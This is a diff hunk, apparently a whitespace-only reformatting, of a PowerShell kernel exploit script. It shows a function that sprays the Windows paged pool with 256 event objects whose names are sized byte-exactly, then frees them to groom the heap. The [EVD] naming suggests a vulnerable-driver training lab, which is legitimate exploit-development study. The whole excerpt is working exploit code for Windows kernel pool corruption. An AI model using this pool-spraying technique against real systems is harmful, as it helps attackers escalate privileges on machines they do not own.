@@ -59,26 +59,26 @@ function Random-232 {
 }
 
 function Event-PoolSpray {
-    echo "[+] Allocating 256 unique Event names.."
-    $Spray = @()
-    for ($i=0;$i -lt 256;$i++) {
+	echo "[+] Allocating 256 unique Event names.."
+	$Spray = @()
+	for ($i=0;$i -lt 256;$i++) {
 		# Paged pool => Object Name (ObNm)
 		# 0x8 (header) + 0xf0 (string) = 0xf8
-        $CallResult = [EVD]::CreateEventW([System.IntPtr]::Zero, 0, 0, $("JUNK"+ $([char[]]@(0x01,0x01,0x01,0x0c) -join "") + $(Random-232)))
-        if ($CallResult -ne 0) {
-            $Spray += $CallResult
-        }
-    }
-    $Script:Event_hArray += $Spray
- 
-    echo "[?] Free all the things.."
-    for ($i=0;$i -lt $($Event_hArray.Length);$i++) {
-        $CallResult = [EVD]::CloseHandle($Event_hArray[$i])
-        if ($CallResult -ne 0) {
-            $FreeCount += 1
-        }
-    }
-    echo "[+] Free'd $FreeCount event objects!"
+		$CallResult = [EVD]::CreateEventW([System.IntPtr]::Zero, 0, 0, $("JUNK"+ $([char[]]@(0x01,0x01,0x01,0x0c) -join "") + $(Random-232)))
+		if ($CallResult -ne 0) {
+			$Spray += $CallResult
+		}
+	}
+	$Script:Event_hArray += $Spray
+	
+	echo "[?] Free all the things.."
+	for ($i=0;$i -lt $($Event_hArray.Length);$i++) {
+		$CallResult = [EVD]::CloseHandle($Event_hArray[$i])
+		if ($CallResult -ne 0) {
+			$FreeCount += 1
+		}
+	}
+	echo "[+] Free'd $FreeCount event objects!"
 }
 
 $heap = @"
